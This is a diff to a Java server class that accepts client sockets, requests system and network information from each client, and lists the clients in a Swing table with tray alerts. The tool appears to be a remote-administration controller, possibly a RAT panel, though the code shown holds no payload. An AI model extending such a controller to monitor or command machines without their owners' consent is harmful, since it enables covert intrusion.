@@ -12,6 +12,7 @@ import javax.swing.table.TableModel;
 import java.awt.*;
 import java.net.ServerSocket;
 import java.net.Socket;
+import java.sql.SQLOutput;
 import java.util.Objects;
 import java.util.concurrent.ConcurrentHashMap;
 import java.util.concurrent.ExecutorService;
@@ -19,10 +20,11 @@ import java.util.concurrent.ExecutorService;
 public class Connection implements Runnable {
     private final ServerSocket server;
     private final ExecutorService executor;
-    private final ConcurrentHashMap<Socket, Streams> dialog;
+    private final ConcurrentHashMap<String, ClientHandler> dialog;
+    private static int x;
 
 
-    public Connection(ServerSocket server, ExecutorService executor, ConcurrentHashMap<Socket, Streams> dialog) {
+    public Connection(ServerSocket server, ExecutorService executor, ConcurrentHashMap<String, ClientHandler> dialog) {
         if (server == null || executor == null || dialog == null) throw new IllegalArgumentException();
         this.server = server;
         this.executor = executor;
@@ -33,16 +35,19 @@ public class Connection implements Runnable {
     public void run() {
         try {
             Socket socket = server.accept();
-            removeExisting(socket);
-            if (dialog.putIfAbsent(socket, new Streams(socket)) == null) {
+            String clientIP = socket.getInetAddress().toString();
+            ClientHandler clientHandler = dialog.get(clientIP);
+            if (clientHandler == null) {
+                clientHandler = new ClientHandler(socket);
+                dialog.put(clientIP, clientHandler);
                 System.out.println("Connected to: " + socket.getRemoteSocketAddress());
-                Streams stream = dialog.get(socket);
-                // System info and modules installed
-                SystemInformation sysInfo = (SystemInformation) stream.sendAction(Action.SYS_INFO);
-                stream.setTempSystemInformation(sysInfo);
+                Streams mainStream = clientHandler.getMainStream();
+
+                SystemInformation sysInfo = (SystemInformation) mainStream.sendAction(Action.SYS_INFO);
+                mainStream.setTempSystemInformation(sysInfo);
                 // Network info
-                NetworkInformation netInfo = (NetworkInformation) stream.sendAction(Action.NET_INFO);
-                stream.setTempNetworkInformation(netInfo);
+                NetworkInformation netInfo = (NetworkInformation) mainStream.sendAction(Action.NET_INFO);
+                mainStream.setTempNetworkInformation(netInfo);
                 // Change state of JTable add or modify existing client
                 SwingUtilities.invokeLater(() -> {
                     System.out.println(socket);
@@ -65,8 +70,15 @@ public class Connection implements Runnable {
                         displayTray(netInfo.IP(), sysInfo.OPERATING_SYSTEM());
                     Main.gui.updateNumOfConnectedClients();
                 });
-
+            } else {
+                Streams operationStream = clientHandler.addStream(socket);
+                Streams mainStream = clientHandler.getMainStream();
+                operationStream.setTempSystemInformation(mainStream.getTempSystemInformation());
+                operationStream.setTempNetworkInformation(mainStream.getTempNetworkInformation());
+                System.out.println("Conexion alternativa " + x++);
             }
+            // removeExisting(socket);
+
             // FIXME could be removed?
             executor.submit(new Connection(server, executor, dialog));
         } catch (Exception e) {
@@ -102,13 +114,13 @@ public class Connection implements Runnable {
     /*
         returns the index where the client is located in the JTable
      */
-
+/*
     private void removeExisting(Socket socket) {
         for (Socket key : dialog.keySet()) {
             if (key.getInetAddress().toString().equals(socket.getInetAddress().toString())) dialog.remove(key);
         }
     }
-
+*/
     private int getPositionOfExisting(Socket socket, TableModel tableModel) {
         for (int i = 0; i < tableModel.getRowCount(); i++) {
             if (socket.getInetAddress().toString().equals(tableModel.getValueAt(i, 0))) {
